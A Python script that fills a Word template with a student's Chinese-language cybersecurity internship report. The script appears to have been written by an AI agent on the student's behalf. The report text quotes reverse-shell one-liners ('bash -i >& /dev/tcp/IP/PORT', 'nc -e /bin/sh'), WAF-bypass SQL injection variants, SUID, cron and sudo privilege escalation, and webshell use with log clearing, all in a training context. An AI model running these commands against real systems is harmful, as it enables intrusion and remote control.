#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""为王宇杨填写实习报告 — 精简行数适配模板19个段落位"""

from docx import Document
from docx.shared import Pt

template_path = '/root/.openclaw/media/qqbot/downloads/1905229424/17911036127897E831347AF9570D93DF/0bfb8723-348a-4af9-898c-71e71ea272d8.docx'
output_path = '/opt/Class01/项目/网络安全实践-2实习报告-王宇杨.docx'

doc = Document(template_path)
table = doc.tables[0]
cell = table.rows[0].cells[0]

# 总共19个段位（P7-P25），引导段1个+空行9个+条目9个 = 正好19
main_lines = [
    '实训以 Kali Linux 为基础平台，以 Flask Web 用户管理系统为实训项目，从攻防双视角系统性地开展了以下实训内容：',
    '',
    '0x01 Kali 操作系统初始化：完成 Kali Linux 2026 的安装与系统初始化配置，包括系统更新、网络配置、中文环境设置、基础工具链（git、curl、wget、python3 等）安装，建立标准化的渗透测试工作环境。了解了 Kali 内置的各类安全工具分类与用途，掌握了软件包管理、用户权限管理、服务管理、网络配置等基础运维操作，为后续实训环节奠定了坚实的系统基础。',
    '',
    '0x02 AI 系统安装：部署 OpenClaw AI Agent 系统，完成基础配置与插件安装，熟悉了 AI Agent 的架构设计和工作原理。通过配置 AI 辅助安全分析的环境，实现了利用大语言模型进行代码审计、漏洞分析、方案设计和报告自动生成的能力。掌握了 AI Agent 的工具调度机制、技能安装与管理、会话管理等核心功能。',
    '',
    '0x03 OpenClaw 安装对接 QQ Bot：完成 OpenClaw AI Agent 与 QQ Bot 通道的对接配置，包括 Bot 的注册申请、权限配置、消息路由设置。实现了通过 QQ 与 AI Agent 实时交互的能力，包括消息接收、命令执行、结果反馈等功能的调试与验证。通过 QQ 通道实现远程操作的能力显著提升了实训效率。',
    '',
    '0x04 密码安全：系统学习了密码安全相关知识。0x01 常见部署系统默认用户密码：梳理了路由器、数据库（MySQL、PostgreSQL）、中间件（Tomcat、Nginx）、物联网设备等常见系统的默认账号密码，建立安全意识基线。0x02 用户名密码泄露：分析泄露途径（数据库注入、日志泄露、社会工程学、撞库攻击等），学习密码保护策略。0x03 TOP7 CVE-2026-40910 frp 漏洞：分析内网穿透工具 frp 的最新高危漏洞。0x04 Burp Suite 安装：Kali 下完成安装配置，包括 JDK 配置、社区版/专业版对比、扩展插件使用。0x05 代理设置：配置代理监听（127.0.0.1:8080）、导入 CA 证书实现 HTTPS 解密，掌握流量拦截修改放行。0x06 BP 字典攻击：使用 Intruder 模块搭配 Kali 内置 wordlists 字典库进行爆破攻击，掌握 Payload 设置与结果分析筛选方法。',
    '',
    '0x05 文件上传实验：发现存在路径穿越漏洞（../../etc/shell.php）和 Content-Type 绕过漏洞。修复方案：使用 werkzeug.secure_filename() 处理文件名、新增文件魔数校验读取文件头字节验证真实类型（PNG:89 50 4E 47、JPEG:FF D8、GIF:47 49 46 38）、限制文件大小 2MB、设置上传目录不可执行权限。',
    '',
    '0x06 越权：发现垂直越权（未登录用户可访问需认证页面）和水平越权（修改 user_id 参数可查看他人信息）两类漏洞。修复方案：新增 login_required 装饰器统一认证管理，在敏感接口校验当前用户仅能操作自己的数据。',
    '',
    '0x07 WAF 绕过：以 SQLi-LABS 靶场开展 WAF 绕过 Fuzz 测试，掌握注释符绕过（/**/）、大小写混淆（UnIoN SeLeCt）、双写绕过（UNUNIONION）、编码绕过（URL/Unicode/Hex）、HTTP 参数污染（HPP）等技巧。',
    '',
    '0x08 文件包含：/page 路由存在本地文件包含漏洞，可读取 /etc/passwd 等系统文件，结合文件上传可实现 RCE。修复方案：使用 os.path.normpath + os.path.realpath 双重路径校验，确保路径在 pages/ 目录前缀下；同时对内容做 HTML 转义防止 XSS。',
    '',
    '0x09 CSRF 漏洞：所有 POST 操作（改密、充值、上传等）未携带 CSRF Token，攻击者可通过构造恶意页面诱导用户执行非预期操作。修复方案：Flask-WTF CSRFProtect 中间件全局启用 CSRF 保护，所有表单添加隐藏的 csrf_token 字段。',
    '',
    '0x10 NPS 客户端配置：掌握 NPS 架构原理（服务端+客户端模式）、服务端部署配置（端口绑定、认证密钥、Web 管理界面）、客户端连接配置（VKEY 验证）、隧道协议选择（TCP/UDP/HTTP/SOCKS5 各协议适用场景）。通过配置客户端隧道实现外网访问内网服务，理解 NAT 穿透在内网渗透和远程运维中的关键应用。',
    '',
    '0x11 Linux 常见利用手法：SUID 提权（find / -perm -4000 查找 SUID 程序利用执行）、计划任务利用（检查 crontab 配置插入恶意命令）、sudo 配置错误（sudo -l 查看权限利用不当配置提权）、内核漏洞提权（Dirty Pipe、PwnKit 等）。',
    '',
    '0x12 PHP 反弹 Shell 木马使用：编写 PHP 一句话木马（eval/assert/preg_replace 型），结合反向 Shell 实现 WebShell 管理。掌握大马与小马的区别、WebShell 管理工具（蚁剑、冰蝎、哥斯拉）配置与流量特征分析、日志清除方法。',
    '',
    '0x13 Shell 反弹手法：bash 反弹（bash -i >& /dev/tcp/IP/PORT 0>&1）、nc 反弹（nc -e /bin/sh IP PORT）、Python 反弹（socket+dup2+subprocess 三步法）、PHP 反弹（fsockopen+exec）。学习正向连接（bind shell）与反向连接（reverse shell）的应用场景及防火墙穿透原理。',
]

for i, text in enumerate(main_lines):
    idx = 7 + i
    p = cell.paragraphs[idx]
    for run in list(p.runs):
        run.text = ''
    if text:
        run = p.add_run(text)
        run.font.size = Pt(12)
        run.font.name = '宋体'

# ============ 实习总结（P27开始） ============
summary_lines = [
    '通过本次为期九天的网络安全实训，我从 Kali Linux 基础操作到 Web 安全漏洞深度修复，系统性地构建了完整的网络安全知识体系。本次实训内容涵盖从底层系统操作到上层 Web 应用安全的全链路技术栈，包括 0x01 Kali 系统初始化、0x02 AI 系统安装、0x03 OpenClaw+QQBot 对接、0x04 密码安全与暴力破解（含 Burp Suite 安装配置、代理设置、字典攻击、默认密码梳理、密码泄露分析、frp 漏洞分析等六项）、0x05 文件上传漏洞、0x06 越权漏洞、0x07 WAF 绕过、0x08 文件包含漏洞、0x09 CSRF 漏洞、0x10 NPS 内网穿透、0x11 Linux 利用手法、0x12 PHP 反弹木马、0x13 Shell 反弹手法共 20 余个细分知识点，做到了理论与实践的紧密结合。',
    '',
    '在实训项目的安全加固实践中，我将上述安全知识转化为具体的漏洞修复行动，完成了 Flask 用户管理系统从初始版本到全面安全加固的完整演进。项目覆盖用户注册登录、个人资料管理、头像上传、URL 抓取、搜索、页面管理、Ping 网络诊断等完整功能链，累计修复了 SQL 注入、越权、CSRF、文件上传绕过、文件包含、XSS、SSRF、SSTI 模板注入、命令注入等 9 大类安全漏洞。修复过程严格遵循安全开发规范，每一处修复都经过漏洞原理分析、攻击载荷验证、修复方案设计、代码实现、回归测试的完整闭环，共计完成 20 次 Git 提交，生成 8 份 Word 格式的独立漏洞修复报告存档于 GitHub 仓库。通过这些实操，我深刻体会到一个看起来功能正常的 Web 应用在安全层面可能存在多少隐患，也建立了所有用户输入不可信的安全编码思维。',
    '',
    '在工具使用方面，熟练掌握了安全从业人员必备的核心技能。Kali Linux 作为渗透测试基础平台，使用其内置的各类安全工具完成从信息收集到漏洞利用的完整流程。Burp Suite 的熟练使用是本次实训的重要收获之一，从代理配置安装 CA 证书到 HTTPS 流量解密、从请求拦截修改到 Intruder 模块的字典攻击全流程操作均已掌握。通过 Intruder 的四种攻击模式（Sniper、Battering Ram、Pitchfork、Cluster Bomb）的对比实践，深入理解不同场景下的最优攻击策略选择。OpenClaw AI Agent 的使用让我体验了 AI 辅助安全工作的新范式，Git 版本管理则让我养成了规范的代码管理习惯。',
    '',
    '本次实训的另一重要收获是内网渗透与系统利用能力的建立。通过 NPS 客户端配置掌握了内网穿透隧道建立方法，理解正向代理与反向代理的区别、TCP/UDP/HTTP/SOCKS5 不同隧道协议的适用场景。通过 Linux 常见利用手法学习了 SUID 提权、计划任务利用、sudo 配置错误利用、内核漏洞提权等系统层面攻击技术，建立 Linux 系统安全加固的全面认识。通过 PHP 反弹木马和多种 Shell 反弹手法（bash/nc/Python/PHP）掌握远程控制与权限维持的核心技能。这些进阶内容让我对网络安全的认知从单一的 Web 应用层面拓展到系统层和网络层，形成更为立体的安全知识架构。',
    '',
    '实训最大的收获是安全思维的建立与实践。从最初的 SQL 注入使用参数化查询即可修复，到 SSTI 需要深入理解模板引擎原理才能防御，再到命令注入需要三层防御策略构建纵深防御——每一个漏洞的修复都让我更深刻理解：安全不是某个独立的功能模块，而是贯穿开发全生命周期的持续过程。安全设计需要在需求阶段就开始考虑，安全编码需要融入每一行代码，安全测试需要覆盖所有输入输出路径。从攻击者视角理解漏洞利用手段，从防御者视角设计多层次修复方案——这种双向安全思维将伴随我未来的技术成长，也是本次实训最重要的收获。',
    '',
    '感谢实训指导教师陈腾老师的指导以及 AI 辅助工具的支持。本次实训让我从一个对 Web 安全仅有模糊概念的学生，成长为能够独立完成漏洞发现、分析、修复及报告撰写的准安全从业者。未来我将继续深入学习容器安全、移动安全、DevSecOps 等进阶方向，不断提升专业能力。',
]

for i, text in enumerate(summary_lines):
    idx = 27 + i
    p = cell.paragraphs[idx]
    for run in list(p.runs):
        run.text = ''
    if text:
        run = p.add_run(text)
        run.font.size = Pt(12)
        run.font.name = '宋体'

doc.save(output_path)
print(f'✅ 完成: {output_path}')
